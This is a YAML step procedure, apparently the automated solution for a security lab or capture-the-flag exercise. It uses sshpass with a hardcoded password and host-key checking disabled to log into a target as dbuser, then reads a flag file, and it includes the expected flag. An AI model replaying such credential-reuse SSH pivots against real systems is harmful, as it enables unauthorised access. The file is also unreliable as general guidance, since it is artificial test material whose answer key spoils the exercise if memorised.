procedure:
- action:
    command: pgrep -x sshd && echo 'SSH running'
    type: exec_target
  expect:
    stdout_contains: SSH running
  outputs: {}
  session: null
  step_id: verify_ssh_running
  timeout: 10
- action:
    command: which sshpass || apt-get install -y sshpass
    type: exec_attacker
  expect:
    exit_code: 0
  outputs: {}
  session: null
  step_id: install_sshpass
  timeout: 30
- action:
    command: sshpass -p 'SuperSecret123' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10
      dbuser@${target_host} whoami
    type: exec_attacker
  expect:
    stdout_contains: dbuser
  outputs: {}
  session: null
  step_id: ssh_login_whoami
  timeout: 20
- action:
    command: sshpass -p 'SuperSecret123' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10
      dbuser@${target_host} cat /home/dbuser/flag.txt
    type: exec_attacker
  expect:
    stdout_contains: FLAG{ssh_pivot_successful_via_sqli_credentials}
  outputs: {}
  session: null
  step_id: read_flag
  timeout: 20
sessions: []
